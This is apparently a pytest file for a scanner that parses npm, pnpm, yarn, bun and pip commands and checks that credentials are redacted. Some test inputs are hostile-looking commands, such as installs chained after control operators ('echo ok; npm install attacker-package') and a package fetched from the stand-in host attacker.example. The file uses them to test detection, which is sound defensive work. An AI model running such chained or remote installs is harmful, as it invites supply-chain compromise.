from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.runtime.package_intent import (
    extract_package_intent_request,
    parse_package_intent,
)
from tests.package_intent_fixtures import (
    _native_package_intent,  # noqa: F401 -- registers the module autouse fixture
    _write_text,
)


def test_parse_package_intent_empty_command_returns_none() -> None:
    assert parse_package_intent("") is None
    assert parse_package_intent("   \t\n") is None


def test_extract_uses_selected_guard_home_over_ambient_home(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, package_intent_native: Path
) -> None:
    from codex_plugin_scanner.guard import config

    foreign_home = tmp_path / "unenrolled-home"
    foreign_home.mkdir()
    request = {"command": "npm install left-pad@1.3.0"}

    assert extract_package_intent_request(
        "shell", request, action_envelope_command=None, workspace=tmp_path, guard_home=foreign_home
    ) is None

    monkeypatch.setattr(config, "resolve_guard_home", lambda: foreign_home)
    selected = extract_package_intent_request(
        "shell", request, action_envelope_command=None, workspace=tmp_path, guard_home=package_intent_native
    )
    assert selected is not None
    assert selected.targets[0].package_name == "left-pad"
    assert selected.targets[0].requested_specifier == "1.3.0"


def test_parse_package_intent_npm_install_supports_aliases_tags_versions_and_flags(tmp_path: Path) -> None:
    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')

    intent = parse_package_intent(
        "npm add @scope/widget@1.2.3 alias@npm:real-widget@latest plain --save-dev --registry https://registry.npmjs.org",
        workspace=tmp_path,
    )

    assert intent is not None
    assert intent.package_manager == "npm"
    assert intent.intent_kind == "install"
    assert intent.flags == ("--save-dev", "--registry")
    assert intent.manifest_paths == ("package.json",)
    assert [target.package_name for target in intent.targets] == ["@scope/widget", "real-widget", "plain"]
    assert [target.requested_specifier for target in intent.targets] == ["1.2.3", "latest", None]
    assert intent.targets[1].alias == "alias"


def test_parse_package_intent_pnpm_install_tracks_workspace_flags_and_lockfile_context(tmp_path: Path) -> None:
    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')
    _write_text(tmp_path / "pnpm-workspace.yaml", "packages:\n  - apps/*\n")
    _write_text(tmp_path / "pnpm-lock.yaml", "lockfileVersion: '9.0'\n")

    intent = parse_package_intent(
        "pnpm install --filter @apps/web --workspace-root --lockfile-only",
        workspace=tmp_path,
    )

    assert intent is not None
    assert intent.package_manager == "pnpm"
    assert intent.intent_kind == "install"
    assert intent.targets == ()
    assert intent.flags == ("--filter", "--workspace-root", "--lockfile-only")
    assert intent.manifest_paths == ("package.json", "pnpm-workspace.yaml")
    assert intent.lockfile_paths == ("pnpm-lock.yaml",)


def test_parse_package_intent_yarn_supports_classic_and_workspace_berry_forms(tmp_path: Path) -> None:
    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')

    classic = parse_package_intent("yarn add react@18.3.0", workspace=tmp_path)
    berry = parse_package_intent("yarn workspace web add @types/node@latest lodash", workspace=tmp_path)

    assert classic is not None
    assert classic.package_manager == "yarn"
    assert classic.intent_kind == "install"
    assert classic.targets[0].package_name == "react"
    assert classic.targets[0].requested_specifier == "18.3.0"
    assert berry is not None
    assert berry.package_manager == "yarn"
    assert berry.intent_kind == "install"
    assert berry.notes == ("workspace:web",)
    assert [target.package_name for target in berry.targets] == ["@types/node", "lodash"]


def test_parse_package_intent_bun_install_uses_bun_lock_context(tmp_path: Path) -> None:
    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')
    _write_text(tmp_path / "bun.lock", "{ }\n")

    intent = parse_package_intent("bun install --lockfile-only", workspace=tmp_path)

    assert intent is not None
    assert intent.package_manager == "bun"
    assert intent.intent_kind == "install"
    assert intent.lockfile_paths == ("bun.lock",)
    assert intent.flags == ("--lockfile-only",)


def test_package_sync_does_not_treat_fd_merge_as_a_package_target(tmp_path: Path) -> None:
    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')

    bun = parse_package_intent("bun install 2>&1 | tail -5", workspace=tmp_path)
    pnpm = parse_package_intent("pnpm install 2>&1 | tail -5", workspace=tmp_path)

    assert bun is not None
    assert bun.intent_kind == "install"
    assert bun.targets == ()
    assert pnpm is not None
    assert pnpm.intent_kind == "install"
    assert pnpm.targets == ()


def test_parse_package_intent_exec_commands_are_classified_as_execute_requests() -> None:
    commands = {
        "npx create-vite@latest": ("npx", "create-vite", "latest"),
        "npm exec --package=create-vite create-vite@latest": ("npm", "create-vite", "latest"),
        "pnpm dlx create-next-app@latest": ("pnpm", "create-next-app", "latest"),
        "yarn dlx @redwoodjs/create-redwood-app@latest": ("yarn", "@redwoodjs/create-redwood-app", "latest"),
        "bunx @angular/cli@next": ("bunx", "@angular/cli", "next"),
    }

    for command, (manager, package_name, requested_specifier) in commands.items():
        intent = parse_package_intent(command)

        assert intent is not None
        assert intent.package_manager == manager
        assert intent.intent_kind == "execute"
        assert intent.targets[0].package_name == package_name
        assert intent.targets[0].requested_specifier == requested_specifier


def test_parse_package_intent_detects_package_command_after_control_operator() -> None:
    commands = {
        "true && npx attacker-package": ("npx", "attacker-package"),
        "echo ok; npm install attacker-package": ("npm", "attacker-package"),
        "echo ok\nnpm install attacker-package": ("npm", "attacker-package"),
        "false || pnpm dlx attacker-package": ("pnpm", "attacker-package"),
        "echo ok | bunx attacker-package": ("bunx", "attacker-package"),
        "echo ok & pip install attacker-package": ("pip", "attacker-package"),
    }

    for command, (manager, package_name) in commands.items():
        intent = parse_package_intent(command)

        assert intent is not None
        assert intent.package_manager == manager
        assert intent.targets[0].package_name == package_name

    assert parse_package_intent("echo safe && grep foo src/file.ts") is None


def test_inline_path_assignment_uses_supplied_environment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    supplied_bin = tmp_path / "supplied-bin"
    ambient_bin = tmp_path / "ambient-bin"
    fallback_bin = tmp_path / "fallback-bin"
    for directory in (supplied_bin, ambient_bin, fallback_bin):
        directory.mkdir()
    supplied_npx = supplied_bin / "npx"
    supplied_npx.write_text("#!/bin/sh\n", encoding="utf-8")
    supplied_npx.chmod(0o755)
    ambient_npx = ambient_bin / "npx"
    ambient_npx.write_text("#!/bin/sh\n", encoding="utf-8")
    ambient_npx.chmod(0o755)
    monkeypatch.setenv("MANAGER_BIN", str(ambient_bin))

    intent = parse_package_intent(
        "PATH=$MANAGER_BIN:$PATH npx -y fixture@latest",
        workspace=tmp_path,
        environment={"MANAGER_BIN": str(supplied_bin), "PATH": str(fallback_bin)},
    )

    assert intent is not None
    manager = intent.local_executions[0].manager
    assert manager is not None
    assert manager.resolved_path == str(supplied_npx.resolve())


@pytest.mark.parametrize(
    "command",
    (
        "pnpm exec vitest run tests/unit.test.ts",
        "uv run pytest tests/test_unit.py",
        "poetry run pytest tests/test_unit.py",
        "pipenv run pytest tests/test_unit.py",
        "python -m pytest tests/test_unit.py",
        "cargo test",
        "go test ./...",
        "mvn test",
        "./gradlew test",
        "bundle exec rspec spec/unit_spec.rb",
        "vendor/bin/phpunit tests/Unit",
    ),
)
def test_parse_package_intent_leaves_non_js_package_executors_unclassified(command: str) -> None:
    assert parse_package_intent(command) is None


def test_parse_package_intent_combines_multiple_package_segments() -> None:
    intent = parse_package_intent("npm install left-pad && npm install attacker-package@1.0.0")

    assert intent is not None
    assert intent.package_manager == "npm"
    assert intent.intent_kind == "install"
    assert [target.package_name for target in intent.targets] == ["left-pad", "attacker-package"]
    assert [target.requested_specifier for target in intent.targets] == [None, "1.0.0"]
    assert "left-pad" in intent.redacted_command
    assert "attacker-package@1.0.0" in intent.redacted_command


def test_parse_package_intent_npm_exec_prefers_explicit_package_when_command_differs() -> None:
    intent = parse_package_intent("npm exec --package cowsay hello")

    assert intent is not None
    assert intent.package_manager == "npm"
    assert intent.intent_kind == "execute"
    assert intent.targets[0].package_name == "cowsay"


def test_parse_package_intent_skips_wrapper_flags_before_manager_detection() -> None:
    npm_intent = parse_package_intent("sudo -E npm install react")
    pip_intent = parse_package_intent("env -i pip install flask==3.0.0")

    assert npm_intent is not None
    assert npm_intent.package_manager == "npm"
    assert npm_intent.targets[0].package_name == "react"
    assert pip_intent is not None
    assert pip_intent.package_manager == "pip"
    assert pip_intent.targets[0].package_name == "flask"


def test_parse_package_intent_supports_manager_global_options_before_guarded_subcommands(tmp_path: Path) -> None:
    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')

    npm_intent = parse_package_intent(
        "npm --prefix . install https://attacker.example/pkg.tgz",
        workspace=tmp_path,
    )
    pnpm_intent = parse_package_intent("pnpm --dir . add minimist@1.2.8", workspace=tmp_path)
    yarn_intent = parse_package_intent("yarn --cwd . workspace web add react@18.3.0", workspace=tmp_path)
    pip_intent = parse_package_intent("pip --isolated install requests==2.32.3", workspace=tmp_path)

    assert npm_intent is not None
    assert npm_intent.package_manager == "npm"
    assert npm_intent.targets[0].source_url == "https://attacker.example/pkg.tgz"
    assert pnpm_intent is not None
    assert pnpm_intent.package_manager == "pnpm"
    assert pnpm_intent.targets[0].package_name == "minimist"
    assert yarn_intent is not None
    assert yarn_intent.package_manager == "yarn"
    assert yarn_intent.notes == ("workspace:web",)
    assert yarn_intent.targets[0].package_name == "react"
    assert pip_intent is not None
    assert pip_intent.package_manager == "pip"
    assert pip_intent.targets[0].package_name == "requests"


def test_parse_package_intent_keeps_install_subcommand_when_global_option_value_is_missing(tmp_path: Path) -> None:
    intent = parse_package_intent("pip --index-url install requests==2.32.3", workspace=tmp_path)

    assert intent is not None
    assert intent.package_manager == "pip"
    assert intent.targets[0].package_name == "requests"


def test_parse_package_intent_only_emits_package_metadata_and_redacted_command_shape() -> None:
    intent = parse_package_intent(
        "PIP_INDEX_URL=https://user:pass@example.com/simple pip install private-demo==1.2.3 --hash sha256:deadbeef",
    )

    assert intent is not None
    assert intent.targets[0].package_name == "private-demo"
    assert intent.targets[0].requested_specifier == "1.2.3"
    assert "user:pass" not in intent.redacted_command
    assert "deadbeef" not in intent.redacted_command
    assert "private-demo==1.2.3" in intent.redacted_command
